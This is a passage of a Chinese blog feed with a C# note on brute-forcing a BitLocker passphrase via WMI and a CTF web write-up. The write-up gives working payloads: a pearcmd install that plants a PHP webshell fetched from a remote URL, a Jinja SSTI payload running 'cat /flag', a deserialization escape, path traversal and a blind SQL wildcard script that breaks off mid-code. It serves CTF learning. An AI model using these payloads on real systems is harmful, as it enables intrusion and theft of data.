        <content type="html"><![CDATA[<p>在做 StartCTF 的 Misc 题的时候装不上爆破的工具，于是换了一条思路。既然是微软的东西，自然可以 C# 一把梭写一个爆破小工具，于是找到 <code>Win32_EncryptableVolume</code> 文档顺带查了一些资料就开干了。</p><p><escape><span id="more"></span></escape></p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h3><p>既然是要跟 WMI provider 打交道，WMI CRUD 是必不可少的，于是找了个轮子。</p><p><a href="https://github.com/nicoriff/ORMi">ORMi</a></p><p>Microsoft Docs</p><p><a href="https://docs.microsoft.com/en-us/windows/win32/secprov/win32-encryptablevolume">https://docs.microsoft.com/en-us/windows/win32/secprov/win32-encryptablevolume</a></p><p>Stack Overflow 参考</p><p><a href="https://stackoverflow.com/questions/56360904/bitlocker-values">https://stackoverflow.com/questions/56360904/bitlocker-values</a></p><h3 id="确认服务开启"><a href="#确认服务开启" class="headerlink" title="确认服务开启"></a>确认服务开启</h3><p>WMI Performance Adapter(wmiApSrv)、BitLocker Drive Encryption Service(BDESVC) 需要保持正在运行的状态。</p><h3 id="挂载磁盘"><a href="#挂载磁盘" class="headerlink" title="挂载磁盘"></a>挂载磁盘</h3><p>将 vhdx 虚拟磁盘文件挂载到计算机中。</p><h2 id="按照文档构建"><a href="#按照文档构建" class="headerlink" title="按照文档构建"></a>按照文档构建</h2><h3 id="确定-helper-scope"><a href="#确定-helper-scope" class="headerlink" title="确定 helper scope"></a>确定 helper scope</h3><p>从文档的 <strong>Requirements</strong>  查阅可知 <code>Win32_EncryptableVolume</code> 位于 <code>Root\CIMV2\Security\MicrosoftVolumeEncryption</code>。于是连接至 WMI 时需要将 scope 对应着更改。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WMIHelper helper = <span class="keyword">new</span> WMIHelper(<span class="string">&quot;Root\\CIMV2\\Security\\MicrosoftVolumeEncryption&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="构建类"><a href="#构建类" class="headerlink" title="构建类"></a>构建类</h3><p>ORMi 提供了 <code>[WMIClass()]</code> 的 attribute 用来给类指定别名，<code>[WMIProperty()]</code> 用来给属性指定别名。在未指定别名时，名称需要与文档中保持一致。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">WMIClass(<span class="meta-string">&quot;Win32_EncryptableVolume&quot;</span>)</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">EncryptableVolume</span> : <span class="title">WMIInstance</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> DeviceID &#123;<span class="keyword">get</span>; <span class="keyword">set</span>;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> PersistentVolumeID &#123;<span class="keyword">get</span>; <span class="keyword">set</span>;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> DriveLetter &#123;<span class="keyword">get</span>; <span class="keyword">set</span>;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> ProtectionStatus &#123;<span class="keyword">get</span>; <span class="keyword">set</span>;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="写方法"><a href="#写方法" class="headerlink" title="写方法"></a>写方法</h3><p>文档中提供了几种用于解锁的方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">UnlockWithAdSid : 使用 Active Directory security identifier (SID) 获取 key</span><br><span class="line">UnlockWithCertificateFile : 使用证书文件及其密码</span><br><span class="line">UnlockWithCertificateThumbprint : 使用 CertThumbprint 和证书密码</span><br><span class="line">UnlockWithExternalKey : 使用 256 位的外部 key</span><br><span class="line">UnlockWithNumericalPassword : 使用 48 位的字符串</span><br><span class="line">UnlockWithPassphrase : 使用驱动器密码</span><br></pre></td></tr></table></figure><p>这里采用的是 <code>UnlockWithPassphrase</code> 方法朴素地使用驱动器密码去解锁 BitLocker。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uint32 GetLockStatus(</span><br><span class="line">  [out] uint32 LockStatus</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>文档里对于参数和返回值给出了托管对象格式，但是并不太浅显，调试之后发现 <code>[out]</code> 被塞进了一个 <code>ExpandoObject</code>，而文档中标识的传入 <code>[in]</code> 则是直接以 Object 的形式传入。</p><p>因为方法的返回值为一个 <code>ExpandoObject</code>，因此需要使用一个类来接收值。同时需要配合 ORMi，使用 <code>WMIMethod.ExecuteMethod</code> 来调用对应的方法。这里主要需要的是判断磁盘当前 lock 状态以及使用密码解锁的方法，对照着文档将其还原。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> LockStatus <span class="title">GetLockStatus</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> WMIMethod.ExecuteMethod&lt;LockStatus&gt;(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">LockStatus</span>&#123;</span><br><span class="line">    [<span class="meta">WMIProperty(<span class="meta-string">&quot;LockStatus&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> Status&#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> ReturnValue &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> UnlockStatus <span class="title">UnlockWithPassphrase</span>(<span class="params"><span class="built_in">string</span> passphrase</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> WMIMethod.ExecuteMethod&lt;UnlockStatus&gt;(<span class="keyword">this</span>, <span class="keyword">new</span> &#123; Passphrase = passphrase &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">UnlockStatus</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">uint</span> ReturnValue &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="主要逻辑"><a href="#主要逻辑" class="headerlink" title="主要逻辑"></a>主要逻辑</h3><p>第一步实例化了一个 <code>WMIHelper</code>，这里可以使用它的 <code>Query</code> 方法去查询出所有的 <code>EncryptableVolume</code> 得到一个 List。然后遍历之后使用 <code>GetLockStatus()</code> 去查询状态，当状态为&nbsp;<ruby>Locked<rt>1</rt></ruby>&nbsp;的时候就读取字典调用解锁方法尝试解锁直到 <code>ReturnValue</code> 为&nbsp;<ruby>S_OK<rt>0x0</rt></ruby>&nbsp;的时候 即解锁成功，当解锁不成功时将得到返回值&nbsp;<ruby>FVE_E_FAILED_AUTHENTICATION<rt>0x80310027</rt></ruby>。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="built_in">int</span> LOCKED = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="built_in">uint</span> FVE_E_FAILED_AUTHENTICATION = <span class="number">0x80310027</span>;</span><br><span class="line">    WMIHelper helper = <span class="keyword">new</span> WMIHelper(<span class="string">&quot;Root\\CIMV2\\Security\\MicrosoftVolumeEncryption&quot;</span>);</span><br><span class="line">    List&lt;EncryptableVolume&gt; volumes = helper.Query&lt;EncryptableVolume&gt;().ToList();</span><br><span class="line">    <span class="keyword">foreach</span>(EncryptableVolume volume <span class="keyword">in</span> volumes)&#123;</span><br><span class="line">        <span class="keyword">var</span> lockStatus = volume.GetLockStatus();</span><br><span class="line">        <span class="keyword">if</span>(lockStatus.Status == LOCKED)&#123;</span><br><span class="line">            <span class="comment">//BruteForceHere</span></span><br><span class="line">        &#125;</span><br><span class="line">        Console.WriteLine(lockStatus.Status);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="记"><a href="#记" class="headerlink" title="记"></a>记</h2><p>这篇文章写得不是很细，因为文档上记载了很多不一样的方法以及操作，微软的文档写得巨细靡遗的同时又极度严谨。因为感觉做的时候资料不是太多，所以写出来希望能提供一些正确且有意义的参考。除此之外，工具装不上就自己写一个既定作用的这件事还是蛮好玩的，虽然效率应该是比不上某装了蛮久没装上的工具。</p>]]></content>
      
      
      <categories>
          
          <category> StudyNote </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSharp </tag>
            
            <tag> Skill </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>巅峰极客 2020 &amp; CTF Show 月饼杯</title>
      <link href="/zh-CN/posts/9b2fbf24.html"/>
      <url>/zh-CN/posts/9b2fbf24.html</url>
      
        <content type="html"><![CDATA[<p>是好玩的比赛的 WriteUp！</p><h2 id="巅峰极客-2020"><a href="#巅峰极客-2020" class="headerlink" title="巅峰极客 2020"></a>巅峰极客 2020</h2><h3 id="MeowWorld"><a href="#MeowWorld" class="headerlink" title="MeowWorld"></a>MeowWorld</h3><p>首先看 hint <code>register_argc_argv</code> ，打开环境之后发现在 <code>index.php</code> 有一个简单的文件包含。用 PHP 伪协议读取一圈文件，发现如下内容。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>] ?? <span class="string">&quot;home&quot;</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;<span class="subst">&#123;$f&#125;</span>.php&quot;</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>根据 hint 可知，<code>argc</code> 和 <code>argv</code> 两个参数可以指定，参考 <a href="https://khack40.info/camp-ctf-2015-trolol-web-write-up/">这篇文章</a> 可以知道接下来需要做什么。既然要用 <code>pearcmd</code>，当然是首先读一手源码，于是利用上面的构造读取出 <code>pearcmd</code> 的源码，找到关键部分如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Safely read the $argv PHP array across different PHP configurations.</span></span><br><span class="line"><span class="comment">     * Will take care on register_globals and register_argc_argv ini directives</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed the $argv PHP array or PEAR error if not registered</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">readPHPArgv</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$argv</span>;</span><br><span class="line">        <span class="keyword">if</span> (!is_array(<span class="variable">$argv</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!@is_array(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!@is_array(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="variable">$msg</span> = <span class="string">&quot;Could not read cmd args (register_argc_argv=Off?)&quot;</span>;</span><br><span class="line">                    <span class="keyword">return</span> PEAR::raiseError(<span class="string">&quot;Console_Getopt: &quot;</span> . <span class="variable">$msg</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$argv</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现 <code>argv</code> 会被当成参数返回，于是构造 <code>?f=pearcmd&amp;argv=2+list</code>，得到回显如下，于是按照文章上的指引，准备一个包。</p><p>首先下载 <a href="http://download.pear.php.net/package/Archive_Tar-1.4.0.tgz">这个包</a>，然后在 <code>Archive_Tar-1.4.0/Archive</code> 下增加一个一句话木马的 PHP 文件 <code>zit.php</code>。然后将 <code>./package.xml</code> 文件中的 <code>&lt;content&gt;</code> 节点对应修改如下。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">contents</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dir</span> <span class="attr">name</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">file</span> <span class="attr">baseinstalldir</span>=<span class="string">&quot;/&quot;</span> <span class="attr">md5sum</span>=<span class="string">&quot;89b230679f31da6f8dbdea25095f4ca9&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Archive/Tar.php&quot;</span> <span class="attr">role</span>=<span class="string">&quot;php&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">file</span> <span class="attr">baseinstalldir</span>=<span class="string">&quot;/&quot;</span> <span class="attr">md5sum</span>=<span class="string">&quot;7cc168393304c0c9c0de96d5e5e318e0&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Archive/zit.php&quot;</span> <span class="attr">role</span>=<span class="string">&quot;doc&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">file</span> <span class="attr">baseinstalldir</span>=<span class="string">&quot;/&quot;</span> <span class="attr">md5sum</span>=<span class="string">&quot;2fb90f0be7089a45c09a0d1182792419&quot;</span> <span class="attr">name</span>=<span class="string">&quot;docs/Archive_Tar.txt&quot;</span> <span class="attr">role</span>=<span class="string">&quot;doc&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dir</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">contents</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将整个包按原格式压缩还原为 <code>tar.gz</code>，然后上传至服务器获取支链 <code>https://v2.api.lemonprefect.cn/static/zips/zit.tar.gz</code>。接下来构造 <code>?f=pearcmd&amp;argv=list+install+--installroot+/tmp/+https://v2.api.lemonprefect.cn/static/zips/zit.tar.gz</code>，得到包安装成功的回显 <code>install ok: channel://pear.php.net/Archive_Tar-1.4.0</code>。</p><p>此时只需要找到 <code>zit.php</code> 的路由即可，随便输入一个之后看到报错中的关键信息 <code>include_path=&#39;.:/usr/local/lib/php&#39;</code>，于是拼合包的路径之后访问 <code>/tmp/usr/local/lib/php/doc/Archive_Tar/Archive/zit</code> 拿到 shell 的路由。使用蚁剑连接上去，可以看到 <code>/readflag</code>。</p><p>执行 <code>/readflag</code> 时发现需要计算算术题，但是默认的虚拟终端没有交互，于是使用 perl 脚本完成这一步。在 <code>/tmp/tmp</code> 目录下写入脚本并执行即可得 flag。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> IPC::Open3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $pid = open3( \*CHLD_IN, \*CHLD_OUT, \*CHLD_ERR, <span class="string">&#x27;/readflag&#x27;</span> )</span><br><span class="line">  <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">&quot;open3() failed $!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $r;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;$r&quot;</span>;</span><br><span class="line"></span><br><span class="line">$r = <span class="keyword">substr</span>($r,<span class="number">0</span>,<span class="number">11</span>);</span><br><span class="line">$r = <span class="keyword">eval</span> <span class="string">&quot;$r&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;$r\n&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> CHLD_IN <span class="string">&quot;$r\n&quot;</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;$r&quot;</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;$r&quot;</span>;</span><br></pre></td></tr></table></figure><div align=center><p><img src="https://butter.lumosary.workers.dev/images/archive/3288e007-47a8-4869-8d8c-a2c31f2d3e97/1613214156090448.1f378a59ca61b45569e160e6e64d5492359d9222.png" alt="perl 脚本执行得到 flag"></p></div><h3 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h3><p>看界面，老 Whoami 了。直接看请求，发现是 SSTI，一套标准拳打出，拿到 flag。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../loged?name=&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure><div align=center><p><img src="https://butter.lumosary.workers.dev/images/archive/3288e007-47a8-4869-8d8c-a2c31f2d3e97/1613214156174944.e118a27a9dfb1fed2e8882e9c237c5eff3dbd09d.png" alt="回显 flag"></p></div><h2 id="CTF-Show-月饼杯"><a href="#CTF-Show-月饼杯" class="headerlink" title="CTF Show 月饼杯"></a>CTF Show 月饼杯</h2><h3 id="此夜圆"><a href="#此夜圆" class="headerlink" title="此夜圆"></a>此夜圆</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> str_replace(<span class="string">&#x27;Firebasky&#x27;</span>, <span class="string">&#x27;Firebaskyup&#x27;</span>, <span class="variable">$string</span>);</span><br></pre></td></tr></table></figure><p>此处造成了简单的反序列化逃逸，<code>Firebasky</code> 被替换成 <code>Firebaskyup</code>，字符多出两个。需要构造的反序列化字符串可以写成这样。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;uname&quot;</span>;s:(这里是长度):<span class="string">&quot;(这里是用户名)&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;yu22x&quot;</span>;&#125;<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;i:1;&#125;</span></span><br></pre></td></tr></table></figure><p>总共填充了 30 个字符 <code>&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;</code>，因此需要 15 次替换才能将这 30 个字符变成后面的反序列化内容。<br>于是构造出这样的 payload.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?1&#x3D;FirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyup&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;</span><br></pre></td></tr></table></figure><h3 id="故人心"><a href="#故人心" class="headerlink" title="故人心"></a>故人心</h3><p><strong>level 1</strong><br>使用科学计数法表达一个极小的小数，采用 <code>1e-199</code>。<br><strong>level 2</strong><br>访问 <code>.../robots.txt</code> 可以发现 <code>hinthint.txt</code> 进而找到如下提示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Is it particularly difficult to break MD2?!</span><br><span class="line">I&#39;ll tell you quietly that I saw the payoad of the author.</span><br><span class="line">But the numbers are not clear.have fun~~~~</span><br><span class="line">xxxxx024452    hash(&quot;md2&quot;,$b)</span><br><span class="line">xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b))</span><br></pre></td></tr></table></figure><p>于是写个脚本跑一下 <code>b</code> 和 <code>c</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt;= <span class="number">999</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$b</span> = sprintf(<span class="string">&quot;0e%03d&quot;</span>,<span class="variable">$i</span>) . <span class="string">&quot;024452&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$b</span> == hash(<span class="string">&quot;md2&quot;</span>,<span class="variable">$b</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;b = &quot;</span> . <span class="variable">$b</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt;= <span class="number">9999</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$c</span> = sprintf(<span class="string">&quot;0e%04d&quot;</span>,<span class="variable">$i</span>) . <span class="string">&quot;48399&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$c</span> == hash(<span class="string">&quot;md2&quot;</span>,hash(<span class="string">&quot;md2&quot;</span>,<span class="variable">$c</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;c = &quot;</span> . <span class="variable">$c</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到 <code>b = 0e652024452，c = 0e603448399</code>。<br><strong>level 3</strong></p><blockquote><p>php 会把无法解析的协议当成目录</p></blockquote><p>因此，结合目录穿越就能读到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lemon:&#x2F;&#x2F;ctfshow.com&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;fl0g.txt</span><br></pre></td></tr></table></figure><h3 id="莫负婵娟"><a href="#莫负婵娟" class="headerlink" title="莫负婵娟"></a>莫负婵娟</h3><p>首先看一手页面源码，得到这样的 hint，用户名是 <code>yu22x</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--注意：正式上线请删除注释内容！ --&gt;</span><br><span class="line">&lt;!-- username yu22x --&gt;</span><br><span class="line">&lt;!-- SELECT * FROM users where username like binary(&#39;$username&#39;) and password like binary(&#39;$password&#39;)--&gt;</span><br></pre></td></tr></table></figure><p>结合题目描述的 hint <code>环境变量 +linux字符串截取 + 通配符</code>，尝试一波 SQL 的通配符。</p><div align=center><p><img src="https://butter.lumosary.workers.dev/images/archive/3288e007-47a8-4869-8d8c-a2c31f2d3e97/1613214156234379.e7f79b2646c79d2988d11b9b3c85d610ad788690.png" alt="快看！是通配符呐呐呐"></p></div><p>依照上图的结果构造一波 payload 发现当 <code>password</code> 参数为 <code>6_______________________________</code> 时回显是不一样的，于是写个脚本跑出密码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">const</span> ASCII_START = <span class="number">32</span>;</span><br><span class="line"><span class="keyword">const</span> ASCII_END = <span class="number">127</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="string">&quot;6&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">31</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$p</span> = sprintf(<span class="string">&quot;%0&quot;</span> . (<span class="number">30</span> - <span class="variable">$i</span>) . <span class="string">&quot;d&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$i</span> == <span class="number">30</span>)&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$p</span> = str_replace(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span> = ASCII_START;<span class="variable">$j</span> &lt;= ASCII_END;<span class="variable">$j</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$j</span> == <span class="number">95</span>)&#123;</span><br><span class="line">            <span class="keyword">continue</span>; <span class="comment">//no &quot;_&quot; to be matched</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="string">&#x27;.../login.php&#x27;</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$postData</span> = <span class="keyword">array</span>(<span 